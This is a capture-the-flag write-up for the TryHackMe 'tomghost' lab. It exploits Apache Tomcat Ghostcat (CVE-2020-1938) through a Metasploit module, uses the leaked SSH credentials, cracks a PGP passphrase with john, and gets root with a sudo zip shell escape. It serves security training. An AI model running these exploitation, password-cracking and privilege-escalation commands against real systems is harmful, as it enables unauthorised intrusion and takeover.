# Try Hack Me - tomghost
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 210
# Vulnerabilities: File inclusion (CVE-2020-1938), weak .asc & .pgp file passphrase, SUDO exploitation



# Reconnaissance:
nmap scan:
```bash
nmap -sC -sV <target_ip>
```
PORT     STATE SERVICE    VERSION

22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)

53/tcp   open  tcpwrapped

8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

after visiting the webpage at port 8080, we find the apache version info on the main page: Apache Tomcat/9.0.30. on doing some research, we find out that this is a well known file inclusion vulnerability with the CVE-2020-1938. we immediately enumerate the services to get more information about the ctf. you can read about the vulnerability here : https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md 
lets fuzz the directories of the webpage at port 8080 to find any leads. after fuzzing the directories we got 301 status codes that were not very helpful. 

# Privilege Escalation (A):
 so after enumerating the other services we come to a dead end which is why we are going to use metasploit in order to get some information about the shell via the file inclusion vulnerability.

```bash
msfconsole
```

wait for some time and you will get an interactive interface where you can search for "apache 2020" in order to find the modules made in the year 2020 for the apache server exploits. we find a relevant module named auxiliary/admin/http/tomcat_ghostcat. we use this module in metasploit.

```bash
use auxiliary/admin/http/tomcat_ghostcat
```
now we set the rhosts to the target ip

```bash
set RHOSTS <target_ip>
```

i tried setting the FILENAME to /etc/password but we landed on a 500 status code error. this is a server side error and we cannot do anything about it. so we set the default FILENAME which is the /WEB-INF/web.xml file. if you have chnaged the FILENAME to some other file then you can change it back to the default file using the command:

```bash
set FILENAME /WEB-INF/web.xml
```

now we exploit the system by using the exploit command

```bash
exploit
```

and there we go, we find some user credetnials which must be for the ssh server.

# Shell as skyfuck:

skyfuck: < REDACTED >
 
woah nice username. sky must me the limit for someone ;)
we use these credentials to login the ssh server

```bash
ssh skyfuck@<target_ip>
```

# Shell as merlin:

now we find two interesting files named credential.pgp and tryhackme.asc. we immediately transfer these to my attacker machine in order to analyse them better.

```bash
#on your attacker machine:
scp skyfuck@10.81.136.212:tryhackme.asc .
```
```bash
#after the above file gets transfered, transfer this aswell
scp skyfuck@10.81.136.212:credential.pgp .
```

now since the .pgp and .asc files need to be decrypted and imported respectively using a passphrase, we will bruteforce it using john the ripper. so inorder to do that we will have to create a hash file out of the .asc file for the bruteforce to take place.

```bash
gpg2john tryhackme.asc > pgp_hash.txt
```
it should look something like this  tryhackme.asc:$gpg$*1*...

so once we are done with that, we can start with the bruteforce.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt
```

we get the passphrase within seconds and we use it to import and decrypt the files.

```bash
#first we will import the .asc file
gpg --import tryhackme.asc
```

```bash
#after the .asc file is imported, we will decrypt the .pgp file
gpg --import credential.pgp
```

you will get a prompt to enter the passphrase after typing both these commands, so enter these commands after importing and decrpting. the momnent you decrypt the credential.pgp file, you will get the credentials for the user marlin. now we can access the shell as marlin and escalate our privileges even further.

marlin:< REDACTED >

```bash
su marlin
#enter the password when prompted
```
now we read the user.txt flag as merlin and then submit it.

# Privilege Escalation (B):

now we have a shell as marlin. now lets find if marlin has any sudo access over any commands.

```bash
sudo -l
```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

we are just three commands away from snatching the root.txt flag and completing this room. since /zip is a well known binary, we can file the sudo exploit for it on GTFObins at this link: [GTFObins_zip_to_root](https://gtfobins.github.io/gtfobins/zip/#sudo)

```bash
TF=$(mktemp -u)
```
```bash
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

and that is it for this ctf, we get a root shell and submit the root.txt flag!
